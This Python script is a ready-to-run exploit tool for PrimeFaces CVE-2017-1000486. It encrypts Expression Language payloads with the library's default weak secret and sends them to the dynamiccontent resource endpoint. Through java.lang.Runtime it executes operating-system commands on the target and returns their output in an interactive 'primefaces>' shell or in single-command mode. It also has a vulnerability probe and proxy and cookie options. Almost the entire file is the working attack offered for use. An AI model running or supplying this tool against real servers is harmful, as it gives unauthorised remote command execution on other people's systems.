#!/usr/bin/env python3
"""
PrimeFaces CVE-2017-1000486 Exploit Tool - Interactive Shell
"""

import argparse
import base64
import hashlib
import sys
import requests
import readline  # Para histórico de comandos
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


class PrimeFacesExploit:
    """Main exploit class for CVE-2017-1000486"""
    
    DEFAULT_SECRET = "PrimeSecret"
    DEFAULT_ENDPOINT = "/javax.faces.resource/dynamiccontent.properties.xhtml"
    
    def __init__(self, target_url: str, endpoint: str = None, 
                 secret: str = None, cookie: str = None, 
                 proxy: str = None, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.endpoint = endpoint or self.DEFAULT_ENDPOINT
        self.secret = secret or self.DEFAULT_SECRET
        self.cookie = cookie
        self.proxy = proxy
        self.verbose = verbose
        
        self.session = requests.Session()
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
    
    def encrypt_payload(self, payload: str) -> str:
        """Encrypt payload using the weak PrimeFaces encryption scheme."""
        key = hashlib.md5(self.secret.encode()).digest()
        padded = pad(payload.encode('utf-8'), AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, key[:16])
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode('utf-8')
    
    def execute_command(self, command: str) -> str:
        """Execute command on target and return output."""
        if self.verbose:
            print(f"[*] Executing: {command}")
        
        # Build EL payload for command execution
        el_payload = self.build_el_payload(command)
        
        # Encrypt the payload
        encrypted = self.encrypt_payload(el_payload)
        
        # Send the payload
        response = self.send_payload(encrypted)
        
        # Process response
        if response and response.text:
            output = self.extract_output(response.text)
            return output
        else:
            return "No output received"
    
    def build_el_payload(self, command: str) -> str:
        """Build EL payload for command execution."""
        # Versão melhorada que captura a saída corretamente
        el_payload = (
            f'${{facesContext.getExternalContext().getSession(true).setAttribute('
            f'"cmd",facesContext.getELContext()["class"].forName("java.lang.Runtime")'
            f'.getDeclaredMethods()[0].invoke(null).exec("{command}").getInputStream())}}'
            f'${{facesContext.getExternalContext().getSession(true).setAttribute('
            f'"buf",facesContext.getELContext()["class"].forName("java.lang.StringBuffer")'
            f'.newInstance())}}'
            f'${{facesContext.getExternalContext().getSession(true).setAttribute('
            f'"reader",facesContext.getELContext()["class"].forName("java.io.BufferedReader")'
            f'.getDeclaredMethods()[0].invoke(null,facesContext.getExternalContext()'
            f'.getSession(true).getAttribute("cmd")))}}'
            f'${{facesContext.getExternalContext().getSession(true).setAttribute('
            f'"line",facesContext.getELContext()["class"].forName("java.io.BufferedReader")'
            f'.getDeclaredMethods()[1].invoke(facesContext.getExternalContext()'
            f'.getSession(true).getAttribute("reader")))}}'
            f'${{facesContext.getExternalContext().getSession(true).setAttribute('
            f'"buf2",facesContext.getELContext()["class"].forName("java.lang.StringBuffer")'
            f'.getDeclaredMethods()[0].invoke(facesContext.getExternalContext()'
            f'.getSession(true).getAttribute("buf"),facesContext.getExternalContext()'
            f'.getSession(true).getAttribute("line")))}}'
            f'${{facesContext.getExternalContext().getResponse().getWriter()'
            f'.print(facesContext.getExternalContext().getSession(true).getAttribute("buf"))}}'
        )
        return el_payload
    
    def send_payload(self, encrypted_payload: str) -> requests.Response:
        """Send the encrypted payload to the vulnerable endpoint."""
        url = f"{self.target_url}{self.endpoint}"
        
        params = {
            'pfdrid': encrypted_payload,
            'pfdrt': 'sc',
            'pfdrid_c': '1'
        }
        
        try:
            response = self.session.get(url, params=params, timeout=10)
            return response
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return None
    
    def extract_output(self, response_text: str) -> str:
        """Extract meaningful output from response."""
        # Remove HTML/XML tags and JSF wrappers
        import re
        
        # Remove XML/HTML tags
        clean = re.sub(r'<[^>]+>', '', response_text)
        
        # Remove common JSF wrappers
        clean = re.sub(r'<\?xml[^>]*\?>', '', clean)
        clean = re.sub(r'<!DOCTYPE[^>]*>', '', clean)
        clean = re.sub(r'<!--.*?-->', '', clean, flags=re.DOTALL)
        
        # Clean up whitespace
        lines = [line.strip() for line in clean.split('\n') if line.strip()]
        
        if lines:
            return '\n'.join(lines)
        else:
            return response_text.strip()
    
    def test_vulnerability(self) -> bool:
        """Test if target is vulnerable."""
        test_payload = (
            '${facesContext.getExternalContext().setResponseHeader('
            '"X-PrimeTest","VULNERABLE")}'
        )
        encrypted = self.encrypt_payload(test_payload)
        response = self.send_payload(encrypted)
        
        if response and 'X-PrimeTest' in response.headers:
            print("[+] Target is VULNERABLE to CVE-2017-1000486")
            return True
        else:
            print("[-] Target does not appear vulnerable")
            return False
    
    def interactive_shell(self):
        """Start interactive shell."""
        print("\n" + "="*60)
        print("PrimeFaces CVE-2017-1000486 Interactive Shell")
        print(f"Target: {self.target_url}")
        print("="*60)
        print("Commands:")
        print("  <command>  - Execute OS command on target")
        print("  exit/quit  - Exit shell")
        print("  help       - Show this help")
        print("  clear      - Clear screen")
        print("  test       - Test vulnerability")
        print("="*60 + "\n")
        
        # Test vulnerability first
        print("[*] Testing target...")
        if not self.test_vulnerability():
            print("[!] Warning: Target may not be vulnerable!")
        
        print("\n[+] Shell ready! Type 'help' for commands.\n")
        
        # Command history
        history = []
        
        while True:
            try:
                # Prompt with target info
                cmd = input(f"\033[32mprimefaces>\033[0m ").strip()
                
                if not cmd:
                    continue
                
                # Add to history
                history.append(cmd)
                
                # Built-in commands
                if cmd.lower() in ['exit', 'quit']:
                    print("[*] Exiting shell...")
                    break
                elif cmd.lower() == 'help':
                    print("\nAvailable commands:")
                    print("  <any command>  - Execute on target")
                    print("  exit/quit      - Exit shell")
                    print("  help          - Show this help")
                    print("  clear         - Clear screen")
                    print("  test          - Test if target is vulnerable")
                    print("  history       - Show command history")
                    print()
                    continue
                elif cmd.lower() == 'clear':
                    print("\033[2J\033[H")
                    continue
                elif cmd.lower() == 'test':
                    self.test_vulnerability()
                    continue
                elif cmd.lower() == 'history':
                    if history:
                        print("\nCommand history:")
                        for i, h in enumerate(history, 1):
                            print(f"  {i:3d}  {h}")
                    else:
                        print("No commands in history")
                    continue
                
                # Execute command
                print()  # Blank line before output
                output = self.execute_command(cmd)
                print(output)
                print()  # Blank line after output
                
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit")
                continue
            except EOFError:
                print("\n[!] Exiting...")
                break
            except Exception as e:
                print(f"\n[!] Error: {e}\n")


def main():
    parser = argparse.ArgumentParser(
        description="PrimeFaces CVE-2017-1000486 Interactive Exploit Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start interactive shell (default)
  python3 primefaces_exploit.py -u http://localhost:8080/primefaces-showcase
  
  # With verbose output
  python3 primefaces_exploit.py -u http://localhost:8080/primefaces-showcase -v
  
  # Using custom endpoint and cookie
  python3 primefaces_exploit.py -u http://localhost:8080 -e /custom/path -c "JSESSIONID=abc123"
  
  # Test vulnerability only
  python3 primefaces_exploit.py -u http://localhost:8080/primefaces-showcase --test
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target base URL')
    parser.add_argument('-e', '--endpoint', 
                       default=PrimeFacesExploit.DEFAULT_ENDPOINT,
                       help=f'Vulnerable endpoint')
    parser.add_argument('-s', '--secret', default=PrimeFacesExploit.DEFAULT_SECRET,
                       help='Encryption secret')
    parser.add_argument('--cookie', help='Cookie string')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--test', action='store_true',
                       help='Test vulnerability and exit')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('-c', '--command', 
                       help='Execute single command and exit')
    
    args = parser.parse_args()
    
    # Initialize exploit
    exploit = PrimeFacesExploit(
        target_url=args.url,
        endpoint=args.endpoint,
        secret=args.secret,
        cookie=args.cookie,
        proxy=args.proxy,
        verbose=args.verbose
    )
    
    # Handle different modes
    if args.test:
        exploit.test_vulnerability()
        sys.exit(0)
    
    if args.command:
        # Single command execution
        print("\n" + "="*60)
        print("PrimeFaces Command Execution")
        print("="*60 + "\n")
        
        exploit.test_vulnerability()
        print()
        
        output = exploit.execute_command(args.command)
        
        print("\n" + "="*60)
        print("OUTPUT:")
        print("="*60)
        print(output)
        print("="*60)
    else:
        # Interactive shell (default)
        exploit.interactive_shell()


if __name__ == "__main__":
    main()